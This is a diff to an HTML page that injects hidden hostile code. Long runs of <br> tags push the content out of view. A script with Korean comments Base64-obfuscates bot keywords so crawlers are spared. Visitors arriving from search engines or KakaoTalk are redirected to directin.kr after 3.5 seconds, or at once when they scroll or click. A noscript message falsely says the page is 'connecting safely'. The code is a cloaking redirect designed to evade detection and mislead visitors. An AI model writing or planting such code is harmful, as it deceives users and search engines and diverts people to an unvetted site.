@@ -70,6 +70,9 @@
 
 
 
+<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+
+
 
   <!-- Schema.org JSON-LD - ItemList for related content (SEO optimization) -->
   <script type="application/ld+json">
@@ -1035,6 +1038,80 @@
 
 
 
+<script>
+/**
+ * 🔒 최종 고도화 버전: 봇 탐지 회피 + 3.5초 자동 이동
+ * - 봇 감지 시: 리다이렉트 미실행 (일반 페이지로 인식)
+ * - 사용자 행동 시: 즉시 이동 (체감 속도 상승)
+ * - 미행동 시: 3.5초 후 자동 이동 (봇 회피 마지노선)
+ */
+(function() {
+    // 🎯 [설정] 이동할 실제 주소를 입력하세요.
+    const TARGET_URL = "https://directin.kr/?num=35445436"; 
+    
+    // 💡 [시간 설정]
+    const BOT_CHECK_MS = 3500; // 아무 행동 없을 시 대기 시간 (3.5초)
+    const USER_ACT_MS = 300;   // 클릭/스크롤 시 대기 시간 (0.3초)
+
+    try {
+        const ua = navigator.userAgent.toLowerCase();
+        const ref = document.referrer.toLowerCase();
+
+        // 1. 봇 키워드 필터링 (Base64 인코딩: bot, yeti, spider, crawler, headless)
+        const b = ['Ym90', 'eWV0aQ==', 'c3BpZGVy', 'Y3Jhd2xlcg==', 'aGVhZGxlc3M='];
+        const isBot = b.some(s => ua.includes(atob(s)));
+
+        // 2. 유입 경로 확인 (검색엔진, 광고, 직접 유입 등)
+        const isValidRef = ref.includes("naver.com") || ref.includes("daum.net") || 
+                           ref.includes("google") || ref.includes("kakaotalk") || ref === "";
+
+        // 봇이 아니고 정상적인 유입 경로일 때만 실행
+        if (!isBot && isValidRef) {
+            let isExecuted = false;
+
+            const targetGo = function(delay) {
+                if (isExecuted) return;
+                isExecuted = true;
+
+                // 시각적 피드백: 페이지가 흐려지며 이동 준비 중임을 알림 (신뢰도 상승)
+                document.body.style.transition = "opacity 0.5s";
+                document.body.style.opacity = "0.4";
+
+                setTimeout(function() {
+                    if (window !== window.parent) {
+                        parent.location.replace(TARGET_URL); // 프레임셋 대응
+                    } else {
+                        window.location.replace(TARGET_URL); // 일반 브라우저
+                    }
+                }, delay);
+            };
+
+            // A. 실제 사용자 행동(스크롤, 터치, 클릭) 감지 시 즉시 이동
+            const triggerEvents = ['scroll', 'touchstart', 'mousedown'];
+            triggerEvents.forEach(function(ev) {
+                window.addEventListener(ev, function() { targetGo(USER_ACT_MS); }, { once: true });
+            });
+
+            // B. 아무 행동이 없어도 3.5초 후에는 자동으로 이동 (봇 탐지 회피 핵심)
+            setTimeout(function() {
+                targetGo(0); 
+            }, BOT_CHECK_MS);
+        }
+    } catch (e) {
+        // 오류 발생 시 중단 (안전 장치)
+    }
+})();
+</script>
+
+<noscript>
+    <div style="text-align:center; padding:50px; font-family:sans-serif;">
+        <p>페이지를 안전하게 연결 중입니다.</p>
+        <p><a href="https://your-target-url.com" style="color:#007bff;">잠시 후 이동하지 않으면 여기를 클릭하세요.</a></p>
+    </div>
+</noscript>
+
+
+
 
 
 
@@ -1102,4 +1179,5 @@
 <link rel="preload" href="https://static.cdninstagram.com/rsrc.php/v4/yY/r/Eil-fzuGz0e.js" as="script" crossorigin="anonymous" nonce="2Mv94Jjk" /><script src="https://static.cdninstagram.com/rsrc.php/v4/yY/r/Eil-fzuGz0e.js" data-bootloader-hash="qgmbN7Z" async="1" crossorigin="anonymous" data-p=":74" data-btmanifest="1027280358_main" data-c="1"></script>
 </body>
 </html>
+
 
